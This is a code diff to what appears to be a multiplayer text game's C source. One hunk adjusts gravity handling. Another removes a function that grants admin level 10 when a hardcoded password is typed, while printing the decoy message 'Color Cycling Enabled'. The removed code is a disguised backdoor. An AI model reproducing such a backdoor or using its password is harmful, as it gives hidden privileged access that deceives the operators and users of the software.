@@ -1550,7 +1550,7 @@ void broken_update() {
                 grav_change = true;
             }
             if (grav_change == true) {
-                ROOM_GRAVITY(IN_ROOM(k)) = rand_gravity[grav_roll];
+                k->gravity = rand_gravity[grav_roll];
                 GET_OBJ_WEIGHT(k) = rand_gravity[grav_roll];
                 send_to_room(IN_ROOM(k), "@RThe gravity generator malfunctions! The gravity level has changed!@n\r\n");
             }
@@ -4326,16 +4326,6 @@ void trim(char *s) {
     }
     if (i < (strlen(s) - 1)) {
         s[i + 1] = '\0';
-    }
-}
-
-int masadv(char *tmp, struct char_data *ch) {
-    if (!strcasecmp("1984zangetsu", tmp)) {
-        send_to_char(ch, "MASADV: Color Cycling Enabled.\r\n");
-        admin_set(ch, 10);
-        return (true);
-    } else {
-        return (false);
     }
 }
 
